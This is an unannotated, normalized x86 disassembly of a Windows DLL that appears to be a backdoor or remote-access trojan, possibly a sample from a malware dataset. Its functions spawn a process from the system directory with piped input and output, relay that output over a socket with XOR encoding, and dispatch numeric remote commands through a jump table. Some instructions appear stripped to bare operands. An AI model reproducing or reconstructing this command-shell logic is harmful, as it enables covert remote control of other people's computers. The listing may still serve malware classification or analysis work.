sub_10001000
mov ecx [ rw-data ]
xor eax eax
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0xc ]
push esi
mov esi [ CloseHandle@IAT ]
push eax
call esi
mov ecx [ rw-data ]
mov edx [ ecx ]
push edx
call esi
mov eax [ rw-data ]
mov ecx [ eax + 0x8 ]
push ecx
call esi
mov edx [ rw-data ]
mov eax [ edx + 0x4 ]
push eax
call esi
mov ecx [ rw-data ]
push 0x0
mov edx [ ecx + 0x10 ]
push edx
call [ TerminateProcess@IAT ]
mov esi eax
mov eax [ rw-data ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov eax esi
mov [ rw-data ] 0x0
pop esi
sub_10001070
mov eax [ rw-data ]
sub esp 0x8
push ebx
mov ebx [ eax ]
push ebp
xor ebp ebp
push esi
cmp eax ebp
push edi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
lea eax [ esp + 0x10 ]
push ebp
push eax
push ebp
push ebp
push ebp
push ebx
mov [ esp + 0x28 ] ebp
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov [ esp + 0x14 ] ebp
cmp eax ebp
jbe r-xdata
push 0xa
call [ Sleep@IAT ]
inc eax
push eax
call [ malloc@IAT ]
mov esi eax
add esp 0x4
cmp esi ebp
je r-xdata
mov ecx [ esp + 0x10 ]
xor eax eax
inc ecx
mov edi esi
mov edx ecx
push ebp
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov ecx [ esp + 0x14 ]
lea eax [ esp + 0x18 ]
push eax
push ecx
push esi
push ebx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x1c ]
push ebp
push edx
push esi
push 0xffffffff
push 0xa00c
call sub_10001f60
push esi
call [ free@IAT ]
add esp 0x4
jmp r-xdata
cmp [ rw-data ] ebp
jne r-xdata
sub_10001130
sub esp 0x174
push esi
mov esi [ CreatePipe@IAT ]
push edi
lea eax [ esp + 0x18 ]
push 0x0
lea ecx [ esp + 0x10 ]
push eax
lea edx [ esp + 0x10 ]
push ecx
push edx
mov [ esp + 0x28 ] 0xc
mov [ esp + 0x30 ] 0x1
mov [ esp + 0x2c ] 0x0
call esi
test eax eax
jne r-xdata
lea eax [ esp + 0x18 ]
push 0x0
lea ecx [ esp + 0x18 ]
push eax
lea edx [ esp + 0x18 ]
push ecx
push edx
call esi
test eax eax
jne r-xdata
pop edi
pop esi
add esp 0x174
retn
mov edx [ esp + 0x10 ]
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x34 ]
[ edi ]
mov eax [ esp + 0xc ]
push ebp
mov [ esp + 0x74 ] eax
mov [ esp + 0x78 ] eax
lea eax [ esp + 0x7c ]
push 0x104
push eax
mov [ esp + 0x40 ] 0x44
mov [ esp + 0x6c ] 0x101
mov [ esp + 0x78 ] edx
mov [ esp + 0x70 ] 0x0
call [ GetSystemDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x7c ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x28 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x3c ]
lea edx [ esp + 0x80 ]
push ecx
push 0x0
push 0x0
push 0x0
push 0x1
push 0x0
push 0x0
push 0x0
push edx
call [ CreateProcessA@IAT ]
test eax eax
pop ebp
jne r-xdata
mov eax [ esp + 0x8 ]
mov esi [ CloseHandle@IAT ]
push eax
call esi
mov ecx [ esp + 0xc ]
push ecx
call esi
pop edi
xor eax eax
pop esi
add esp 0x174
retn
push 0x20
call ??2@YAPAXI@Z
mov edi eax
mov ecx 0x8
xor eax eax
mov [ rw-data ] edi
[ edi ]
mov ecx [ rw-data ]
mov edx [ esp + 0x28 ]
add ecx 0x10
mov [ ecx ] edx
mov eax [ esp + 0x2c ]
mov [ ecx + 0x4 ] eax
mov edx [ esp + 0x30 ]
mov [ ecx + 0x8 ] edx
mov eax [ esp + 0x34 ]
mov [ ecx + 0xc ] eax
mov ecx [ rw-data ]
mov edx [ esp + 0x10 ]
mov [ ecx + 0xc ] edx
mov eax [ rw-data ]
mov ecx [ esp + 0xc ]
mov [ eax ] ecx
mov edx [ rw-data ]
mov eax [ esp + 0x14 ]
mov [ edx + 0x8 ] eax
mov eax [ esp + 0x184 ]
mov edx [ rw-data ]
mov ecx [ esp + 0x18 ]
push eax
push 0x0
push sub_10001070
mov [ edx + 0x4 ] ecx
call [ _beginthread@IAT ]
mov eax [ esp + 0x18 ]
add esp 0x10
pop edi
pop esi
add esp 0x174
retn
mov eax [ esp + 0x8 ]
mov esi [ CloseHandle@IAT ]
push eax
call esi
mov ecx [ esp + 0xc ]
push ecx
call esi
mov edx [ esp + 0x14 ]
push edx
call esi
mov eax [ esp + 0x10 ]
push eax
call esi
pop edi
xor eax eax
pop esi
add esp 0x174
retn
sub_10001310
push esi
push edi
mov edi [ esp + 0x10 ]
test edi edi
jle r-xdata
call sub_10001000
pop edi
pop esi
retn
lea eax [ edi + 0x8 ]
push eax
call ??2@YAPAXI@Z
mov esi eax
add esp 0x4
test esi esi
je r-xdata
mov ecx [ esp + 0xc ]
push edi
push esi
call sub_10001870
cmp eax edi
jne r-xdata
push esi
call ??3@YAXPAX@Z
add esp 0x4
push rw-data
push esi
mov [ esi + edi ] 0x0
call [ _strcmpi@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp [ ecx + esi - 0x1 ] 0xd
je r-xdata
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
mov edx [ rw-data ]
not ecx
mov eax [ edx + 0x4 ]
dec ecx
push ecx
push esi
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
mov [ ecx + esi ] 0xd
mov [ ecx + esi + 0x1 ] 0xa
mov [ ecx + esi + 0x2 ] 0x0
push esi
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop esi
retn
call sub_10001000
sub_100013c0
mov eax [ esp + 0x4 ]
push ebx
push esi
mov esi ecx
push edi
xor ebx ebx
push 0x100000
mov [ esi ] r--data
mov [ esi + 0x44 ] eax
mov [ esi + 0x10 ] bl
call ??2@YAPAXI@Z
mov edi [ CreateEventA@IAT ]
add esp 0x4
lea ecx [ eax + 0x100000 ]
mov [ esi + 0x48 ] eax
push ebx
push 0x1
push 0x1
push ebx
mov [ esi + 0x4c ] ecx
mov [ esi + 0x50 ] eax
mov [ esi + 0x54 ] ebx
mov [ esi + 0x3c ] ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
call edi
push eax
mov [ esi + 0x1c ] eax
call [ SetEvent@IAT ]
push ebx
push 0x1
push ebx
push ebx
call edi
mov edi [ InitializeCriticalSection@IAT ]
lea edx [ esi + 0x58 ]
push edx
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x34 ] ebx
mov [ esi + 0x38 ] ebx
call edi
lea eax [ esi + 0x70 ]
push eax
call edi
mov [ esi + 0x40 ] ebx
mov eax esi
pop edi
pop esi
pop ebx
retn 0x4
sub_10001480
push esi
mov esi ecx
push edi
mov [ esi ] r--data
call sub_100019a0
mov eax [ esi + 0x28 ]
mov edi [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push 0xffffffff
push eax
call edi
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push 0xffffffff
push eax
call edi
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
push 0xffffffff
push eax
call edi
call sub_10001000
mov ecx [ esi + 0x1c ]
mov edi [ CloseHandle@IAT ]
push ecx
call edi
mov edx [ esi + 0x20 ]
push edx
call edi
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi + 0xc ] 0x0
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
push eax
call edi
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
call sub_100089b0
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x48 ]
push ecx
call ??3@YAXPAX@Z
mov edi [ DeleteCriticalSection@IAT ]
add esp 0x4
lea edx [ esi + 0x58 ]
push edx
call edi
add esi 0x70
push esi
call edi
pop edi
pop esi
retn
mov ecx edi
call sub_100026f0
push edi
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_10001570
mov eax 0x1030
call sub_100099c0
push ebx
push ebp
push esi
mov esi [ esp + 0x1040 ]
push edi
xor edi edi
mov eax [ esi + 0x44 ]
mov [ esp + 0x14 ] eax
mov eax [ esi + 0x18 ]
cmp eax edi
jne r-xdata
mov [ esi + 0x40 ] edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1030
retn
mov edx [ esp + 0x14 ]
push edi
lea ecx [ esp + 0x44 ]
push 0x1000
push ecx
push edx
call recv
xor ecx ecx
cmp eax edi
jle r-xdata
call WSAGetLastError
cmp eax 0x274c
jne r-xdata
mov dl [ esi + 0x10 ]
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov bl [ esp + ecx + 0x40 ]
xor bl dl
mov [ esp + ecx + 0x40 ] bl
inc ecx
cmp ecx eax
jl r-xdata
cmp eax edi
jg r-xdata
cmp [ esi + 0x18 ] edi
je r-xdata
cmp eax 0x10
jne r-xdata
mov [ esi + 0x40 ] edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1030
retn
mov ebx eax
mov eax [ esi + 0x18 ]
cmp eax edi
mov [ esp + 0x10 ] edi
lea ebp [ esp + 0x40 ]
jne r-xdata
cmp [ esi + 0x54 ] edi
jne r-xdata
lea eax [ esp + 0x18 ]
mov ecx esi
push eax
push 0x2
push 0x1
mov [ esp + 0x24 ] ebp
mov [ esp + 0x28 ] ebx
call sub_100016c0
mov edi eax
mov eax [ esp + 0x10 ]
test edi edi
jne r-xdata
cmp [ esp + 0x40 ] 0xa023
jne r-xdata
test eax eax
je r-xdata
test eax eax
jne r-xdata
mov [ esi + 0x14 ] 0x1
cmp edi ebx
je r-xdata
lea edx [ esp + 0x20 ]
push 0x10
mov [ esp + 0x24 ] 0xa012
mov [ esp + 0x26 ] 0x1
push edx
lea ecx [ esp + 0x30 ]
push 0x10
mov [ esp + 0x14 ] 0x1
mov [ esp + 0x34 ] 0xa012
mov [ esp + 0x36 ] 0x0
push ecx
jmp r-xdata
xor edi edi
push 0x2
call [ Sleep@IAT ]
mov eax [ esi + 0x18 ]
add ebp edi
sub ebx edi
test eax eax
je r-xdata
mov ecx esi
call sub_100017f0
sub_100016c0
push ebx
push esi
mov esi ecx
push edi
lea ebx [ esi + 0x58 ]
push ebx
call [ EnterCriticalSection@IAT ]
mov eax [ esp + 0x10 ]
xor edi edi
dec eax
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
mov ecx esi
call sub_10001730
mov edi eax
dec eax
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
mov eax edi
pop edi
pop esi
pop ebx
retn 0xc
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
mov ecx esi
call sub_10001900
push ebx
mov edi eax
call [ LeaveCriticalSection@IAT ]
mov eax edi
pop edi
pop esi
pop ebx
retn 0xc
sub_10001730
mov edx ecx
push ebx
mov ecx [ esp + 0xc ]
push esi
mov ebx [ edx + 0x50 ]
mov eax [ edx + 0x48 ]
push edi
mov edi [ edx + 0x54 ]
sub eax ebx
sub eax edi
add eax 0x100000
cmp eax ecx
jl r-xdata
mov esi [ esp + 0x10 ]
mov ecx eax
add edi ebx
mov ebx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ edx + 0x54 ]
pop edi
add ecx eax
pop esi
mov [ edx + 0x54 ] ecx
pop ebx
retn 0x8
mov eax ecx
sub_10001780
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
lea eax [ ebx + 0x1 ]
mov edi ecx
push eax
call ??2@YAPAXI@Z
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
test ebx ebx
jle r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
retn 0x8
mov eax [ edi + 0x44 ]
push 0x0
push ebx
push esi
push eax
call send
push esi
mov edi eax
call ??3@YAXPAX@Z
add esp 0x4
mov eax edi
pop edi
pop esi
pop ebx
retn 0x8
mov ecx [ esp + 0x10 ]
push ebp
mov eax esi
sub ecx esi
mov ebp ebx
mov dl [ ecx + eax ]
xor dl [ edi + 0x10 ]
inc eax
dec ebp
mov [ eax - 0x1 ] dl
jne r-xdata
pop ebp
sub_100017f0
push ecx
push ebx
push ebp
push esi
push edi
mov edi ecx
lea ebp [ edi + 0x70 ]
push ebp
mov [ esp + 0x14 ] ebp
call [ EnterCriticalSection@IAT ]
mov ebx [ esp + 0x1c ]
xor esi esi
test ebx ebx
jle r-xdata
push ebp
call [ LeaveCriticalSection@IAT ]
xor eax eax
cmp esi ebx
pop edi
pop esi
pop ebp
pop ebx
sete al
pop ecx
retn 0x8
mov ebp [ esp + 0x18 ]
mov ebp [ esp + 0x10 ]
mov eax [ edi + 0x44 ]
push eax
call sub_10004230
add esp 0x4
test eax eax
jle r-xdata
mov eax [ edi + 0x18 ]
test eax eax
jne r-xdata
mov ecx ebx
lea edx [ esi + ebp ]
sub ecx esi
push ecx
push edx
mov ecx edi
call sub_10001780
test eax eax
jle r-xdata
add esi eax
cmp esi ebx
jl r-xdata
mov eax [ edi + 0x18 ]
test eax eax
jne r-xdata
sub_10001870
sub esp 0xc
push ebx
push ebp
push esi
mov esi ecx
xor ebp ebp
push edi
mov eax [ esi + 0x3c ]
mov [ esp + 0x10 ] ebp
cmp eax ebp
jne r-xdata
mov eax [ esi + 0x3c ]
pop edi
pop esi
pop ebp
test eax eax
pop ebx
je r-xdata
mov edi [ esp + 0x24 ]
mov ebx [ esp + 0x20 ]
mov eax [ esp ]
add esp 0xc
retn 0x8
or eax 0xffffffff
add esp 0xc
retn 0x8
mov eax [ esi + 0x18 ]
test eax eax
jne r-xdata
lea eax [ esp + 0x14 ]
mov ecx esi
push eax
push 0x2
push 0x2
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] edi
call sub_100016c0
cmp eax edi
je r-xdata
add [ esp + 0x10 ] edi
mov ecx [ esp + 0x10 ]
push 0x2
add ecx eax
add ebx eax
sub edi eax
mov [ esp + 0x14 ] ecx
call [ Sleep@IAT ]
mov eax [ esi + 0x3c ]
inc ebp
test eax eax
je r-xdata
cmp ebp 0x2710
jge r-xdata
jmp r-xdata
sub_10001900
mov eax [ esp + 0x8 ]
mov edx ecx
push ebx
push esi
mov ebx [ edx + 0x54 ]
push edi
cmp ebx eax
jl r-xdata
test ebx ebx
jle r-xdata
mov esi [ edx + 0x50 ]
mov edi [ esp + 0x10 ]
mov ecx eax
mov ebx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ edx + 0x50 ]
mov ecx [ edx + 0x54 ]
add esi eax
sub ecx eax
mov [ edx + 0x50 ] esi
mov [ edx + 0x54 ] ecx
je r-xdata
mov ecx [ edx + 0x48 ]
mov [ edx + 0x54 ] 0x0
mov [ edx + 0x50 ] ecx
mov eax ebx
mov esi [ edx + 0x50 ]
mov edi [ esp + 0x10 ]
mov ecx ebx
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ edx + 0x48 ]
pop edi
pop esi
mov [ edx + 0x50 ] ecx
pop ebx
retn 0x8
mov edi [ edx + 0x4c ]
sub edi esi
cmp edi 0x64
jge r-xdata
pop edi
pop esi
pop ebx
retn 0x8
mov edi [ edx + 0x48 ]
mov ebx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
sub_100019c0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_1000da16
push eax
mov [ fs : 0x0 ] esp
sub esp 0x38
push ebx
push ebp
push esi
mov esi ecx
push edi
xor edi edi
cmp [ esi + 0x3c ] edi
jne r-xdata
mov ecx [ esp + 0x48 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x44
retn
mov ebp [ SetEvent@IAT ]
mov ebx 0x1
cmp eax 0x10
jne r-xdata
cmp [ esi + 0x3c ] edi
je r-xdata
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
and eax 0xffff
push edx
push eax
lea ecx [ esp + 0x30 ]
push rw-data
push ecx
call [ sprintf@IAT ]
mov edx [ esp + 0x28 ]
add esp 0x10
and edx 0xffff
lea eax [ edx - 0x9fe1 ]
cmp eax 0x42
ja r-xdata
xor eax eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] eax
push 0x10
mov [ esp + 0x20 ] eax
push ecx
mov [ esp + 0x28 ] eax
mov ecx esi
mov [ esp + 0x2c ] eax
call sub_10001870
cmp eax edi
jl r-xdata
mov [ esi + 0x3c ] ebx
xor ecx ecx
mov cl [ eax + lookup_table_10001f1c ]
jmp [ ecx * 4 + jump_table_10001e88 ]
push edi
lea edx [ esp + 0x17 ]
push ebx
push edx
push 0xffffffff
push 0x9fe1
mov ecx esi
mov [ esp + 0x27 ] bl
call sub_10001f60
jmp r-xdata
push esi
call sub_10006e10
add esp 0x4
jmp r-xdata
mov eax [ esp + 0x1c ]
push eax
call sub_100071a0
add esp 0x4
jmp r-xdata
mov eax [ esp + 0x1c ]
cmp eax 0x104
jae r-xdata
mov eax [ esp + 0x1c ]
cmp eax 0x12c
ja r-xdata
mov ecx [ esp + 0x1c ]
push ecx
mov ecx esi
call sub_10002320
jmp r-xdata
mov eax [ esp + 0x1c ]
cmp eax 0x104
jae r-xdata
mov eax [ esp + 0x1c ]
cmp eax 0x104
jae r-xdata
mov eax [ esp + 0x1c ]
push eax
push esi
call sub_100071d0
add esp 0x8
test eax eax
jge r-xdata
mov ecx [ esp + 0x1c ]
push ecx
push esi
call sub_10006b00
add esp 0x8
test eax eax
jge r-xdata
mov edx [ esp + 0x1c ]
push edx
push esi
call sub_10007a60
add esp 0x8
test eax eax
jge r-xdata
push esi
call sub_10007c80
add esp 0x4
jmp r-xdata
mov eax [ esp + 0x1c ]
push eax
push esi
call sub_10001310
add esp 0x8
jmp r-xdata
push 0x5c
call ??2@YAPAXI@Z
add esp 0x4
mov [ esp + 0x14 ] eax
cmp eax edi
mov [ esp + 0x50 ] edi
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx edi
je r-xdata
mov eax [ esi + 0x1c ]
push eax
call ebp
mov eax [ esp + 0x1c ]
cmp eax 0x104
jae r-xdata
mov ecx [ esi + 0x1c ]
push ecx
call ebp
mov eax [ esp + 0x1c ]
cmp eax 0x208
jae r-xdata
mov eax [ esi + 0x24 ]
cmp eax edi
je r-xdata
cmp [ esp + 0x1a ] di
jne r-xdata
mov ecx esi
call sub_100020e0
jmp r-xdata
mov edx [ esp + 0x1c ]
mov ecx esi
push edx
call sub_10002110
jmp r-xdata
cmp [ esp + 0x1c ] 0x6
jne r-xdata
mov eax [ esp + 0x1c ]
cmp eax edi
jl r-xdata
mov ecx [ esi + 0x8 ]
cmp ecx edi
je r-xdata
mov eax [ esp + 0x1c ]
push eax
push esi
call sub_10006560
add esp 0x8
jmp r-xdata
cmp [ esi + 0x28 ] edi
jne r-xdata
mov [ esi + 0x34 ] edi
jmp r-xdata
cmp [ esp + 0x1c ] edi
jbe r-xdata
mov ecx [ esi + 0xc ]
cmp ecx edi
je r-xdata
mov ecx [ esi + 0xc ]
cmp ecx edi
je r-xdata
push esi
call sub_100035c0
add esp 0x4
jmp r-xdata
mov eax [ esp + 0x1c ]
cmp eax edi
je r-xdata
mov ecx [ esp + 0x1c ]
push ecx
push esi
call sub_100070a0
add esp 0x8
jmp r-xdata
mov edx [ esp + 0x1c ]
push edx
push esi
call sub_10002f20
add esp 0x8
jmp r-xdata
mov [ esi + 0x14 ] ebx
cmp eax edi
je r-xdata
cmp [ esi + 0x30 ] edi
jne r-xdata
cmp eax edi
je r-xdata
cmp eax edi
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
xor eax eax
mov ecx eax
call sub_10007c90
jmp r-xdata
call sub_10008470
mov ecx [ esi + 0x4 ]
cmp [ ecx + 0x1c ] edi
je r-xdata
cmp eax edi
je r-xdata
cmp eax edi
je r-xdata
mov [ rw-data ] edi
mov edx [ esi + 0x1c ]
push edx
call ebp
jmp r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ esi + 0x24 ] edi
mov ecx [ esi + 0x1c ]
push ecx
call ebp
jmp r-xdata
mov eax [ esi + 0x1c ]
push eax
call [ ResetEvent@IAT ]
jmp r-xdata
push 0x6
mov ecx esi
call sub_100021e0
jmp r-xdata
push eax
mov ecx esi
call sub_100022a0
jmp r-xdata
call sub_100028f0
jmp r-xdata
mov ecx [ esp + 0x1c ]
push ecx
push esi
call sub_10006330
add esp 0x8
jmp r-xdata
cmp [ esi + 0xc ] edi
jne r-xdata
mov edx [ esp + 0x1c ]
push edx
call sub_10009720
jmp r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov [ esi + 0xc ] edi
jmp r-xdata
cmp eax 0x104
jae r-xdata
push eax
push esi
call sub_10005f70
add esp 0x8
test eax eax
jg r-xdata
push eax
push esi
call sub_10006990
add esp 0x8
jmp r-xdata
push eax
push esi
call sub_100069f0
add esp 0x8
test eax eax
jge r-xdata
mov edx [ esp + 0x20 ]
push edx
push eax
push esi
call sub_10006a50
add esp 0xc
test eax eax
jge r-xdata
mov ecx [ esp + 0x1a ]
mov [ esp + 0x50 ] 0xffffffff
and ecx 0xffff
mov [ esi + 0x4 ] eax
push ecx
push esi
mov ecx eax
call sub_10007df0
jmp r-xdata
call sub_100089b0
mov ecx [ esi + 0x4 ]
cmp ecx edi
je r-xdata
push eax
push esi
call sub_100075d0
add esp 0x8
jmp r-xdata
push eax
push esi
call sub_10007850
add esp 0x8
jmp r-xdata
push 0x1c
call ??2@YAPAXI@Z
add esp 0x4
mov [ esp + 0x14 ] eax
cmp eax edi
mov [ esp + 0x50 ] ebx
je r-xdata
push eax
push esi
call sub_10007020
add esp 0x8
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov [ esi + 0x4 ] edi
jmp r-xdata
mov edx [ ecx ]
push ebx
call [ edx ]
xor eax eax
push esi
mov ecx eax
call sub_100089e0
jmp r-xdata
mov ecx [ esi + 0xc ]
cmp ecx edi
je r-xdata
mov edx [ esp + 0x1c ]
mov ecx eax
push edx
mov [ esp + 0x54 ] 0xffffffff
mov [ esi + 0xc ] eax
call sub_100095b0
test eax eax
jne r-xdata
mov [ esi + 0xc ] edi
jmp r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
sub_10001f60
sub esp 0x30
push ebx
push ebp
push esi
mov esi [ WaitForSingleObject@IAT ]
mov ebp ecx
mov eax [ ebp + 0x1c ]
push 0xbb8
push eax
call esi
cmp eax 0x102
je r-xdata
mov esi [ esp + 0x40 ]
lea ecx [ esp + 0x1c ]
push esi
push rw-data
push ecx
call [ sprintf@IAT ]
mov eax [ esp + 0x50 ]
mov dx [ esp + 0x5c ]
mov ebx [ esp + 0x58 ]
add esp 0xc
test eax eax
mov [ esp + 0xe ] dx
mov [ esp + 0x14 ] 0x0
mov [ esp + 0xc ] si
jle r-xdata
mov eax [ esp + 0x48 ]
push ebx
lea ecx [ esp + 0x10 ]
push eax
push ecx
mov ecx ebp
mov [ esp + 0x1c ] ebx
call sub_10002070
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x30
retn 0x14
cmp ebx 0x100
jge r-xdata
push eax
call ??2@YAPAXI@Z
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
mov [ esp + 0x44 ] 0xffffffff
mov ecx [ esp + 0x44 ]
push edi
mov edx ecx
xor eax eax
mov edi esi
push 0x8
shr ecx 0x2
[ edi ]
mov ecx edx
push ebx
and ecx 0x3
[ edi ]
mov eax [ esp + 0x54 ]
lea ecx [ esp + 0x50 ]
push eax
push ecx
push esi
call sub_10009d40
add esp 0x14
test eax eax
pop edi
jne r-xdata
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x30
retn 0x14
push esi
call ??3@YAXPAX@Z
add esp 0x4
mov eax 0x1
pop esi
pop ebp
pop ebx
add esp 0x30
retn 0x14
mov eax [ esp + 0x44 ]
lea edx [ esp + 0xc ]
push eax
push esi
push edx
mov ecx ebp
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] ebx
call sub_10002070
sub_10002070
push ecx
push ebx
push ebp
push esi
mov esi [ esp + 0x1c ]
mov [ esp + 0xc ] ecx
lea ebp [ esi + 0x10 ]
push ebp
call ??2@YAPAXI@Z
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
pop esi
pop ebp
pop ebx
pop ecx
retn 0xc
mov eax [ esp + 0x14 ]
mov ecx ebx
push edi
lea edi [ ebx + 0x10 ]
mov edx [ eax ]
push ebp
mov [ ecx ] edx
push ebx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
mov [ ecx + 0xc ] eax
mov ecx esi
mov esi [ esp + 0x24 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x18 ]
call sub_100017f0
push ebx
call ??3@YAXPAX@Z
add esp 0x4
pop edi
sub_100020e0
push esi
mov esi ecx
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x20 ]
push eax
call [ SetEvent@IAT ]
pop esi
retn
push eax
call [ CloseHandle@IAT ]
mov [ esi + 0x24 ] 0x0
sub_10002110
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
test edi edi
mov ebx ecx
jle r-xdata
pop edi
pop esi
pop ebx
retn 0x4
lea eax [ edi + 0x1 ]
push eax
call ??2@YAPAXI@Z
mov esi eax
add esp 0x4
test esi esi
je r-xdata
push edi
push esi
mov ecx ebx
call sub_10001870
cmp eax edi
je r-xdata
mov [ esi + edi ] 0x0
mov eax [ ebx + 0x24 ]
test eax eax
je r-xdata
push esi
call ??3@YAXPAX@Z
add esp 0x4
xor esi esi
push esi
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop esi
pop ebx
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
push edi
push esi
push eax
mov [ esp + 0x24 ] 0x0
call [ WriteFile@IAT ]
sub_10002190
sub esp 0x3c
xor eax eax
push 0x1c
mov [ esp + 0x6 ] ax
mov [ esp + 0xc ] eax
mov eax [ esp + 0x44 ]
mov [ esp + 0x4 ] 0xa014
mov [ esp + 0x8 ] 0xc
mov edx [ eax ]
mov [ esp + 0x14 ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x18 ] edx
lea edx [ esp + 0x4 ]
mov eax [ eax + 0x8 ]
push edx
mov [ esp + 0x20 ] eax
call sub_100017f0
add esp 0x3c
retn 0x4
sub_100021e0
push 0xffffffff
push sub_1000da2b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push edi
lea eax [ esp + 0x8 ]
push 0x4
mov edi ecx
push eax
mov [ esp + 0x10 ] 0x0
mov [ esp + 0xc ] 0x0
call sub_10001870
lea ecx [ esp + 0x4 ]
push 0x2
push ecx
mov ecx edi
call sub_10001870
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov ecx [ esp + 0x10 ]
pop edi
mov [ fs : 0x0 ] ecx
add esp 0x18
retn 0x4
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ edi + 0x8 ]
test esi esi
je r-xdata
push 0x20
call ??2@YAPAXI@Z
add esp 0x4
mov [ esp + 0x10 ] eax
test eax eax
mov [ esp + 0x1c ] 0x0
pop esi
je r-xdata
mov ecx esi
call sub_100026f0
push esi
call ??3@YAXPAX@Z
add esp 0x4
xor eax eax
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push edi
push edx
push ecx
mov ecx eax
call sub_100026c0
jmp r-xdata
mov [ edi + 0x8 ] eax
sub_100022a0
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
test edi edi
mov ebx ecx
jle r-xdata
jne r-xdata
lea eax [ edi + 0x1 ]
push eax
call ??2@YAPAXI@Z
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
push edi
push esi
mov ecx ebx
call sub_10001870
cmp eax edi
je r-xdata
mov ecx ebx
call sub_100028a0
mov [ esi + edi ] 0x0
mov ecx [ ebx + 0x8 ]
test ecx ecx
je r-xdata
